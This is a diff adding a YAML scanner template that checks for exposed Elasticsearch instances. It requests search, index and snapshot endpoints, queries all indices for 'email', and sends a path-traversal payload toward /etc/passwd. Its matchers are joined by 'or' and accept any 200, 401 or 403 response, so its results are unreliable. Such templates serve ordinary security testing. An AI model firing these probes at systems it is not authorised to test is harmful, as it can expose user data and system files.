@@ -1,0 +1,55 @@
+id: elasticsearch-misconfig
+info:
+  name: Elasticsearch Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Elasticsearch instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to data exposure or unauthorized access.
+  tags: elasticsearch, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/_search?pretty"
+      - "{{BaseURL}}/_all/_search?q=email"
+      - "{{BaseURL}}/_cat/indices?v"
+      - "{{BaseURL}}/_plugin/head"
+      - "{{BaseURL}}/_plugin/head/../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/_snapshot/xxxxxxx"
+      - "{{BaseURL}}:9200/_search?pretty"
+      - "{{BaseURL}}:9200/_all/_search?q=email"
+      - "{{BaseURL}}:9200/_cat/indices?v"
+      - "{{BaseURL}}:9200/_plugin/head"
+      - "{{BaseURL}}:9200/_plugin/head/../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:9200/_snapshot/xxxxxxx"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "elasticsearch"
+          - "cluster_name"
+          - "took"
+          - "hits"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "elasticsearch"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
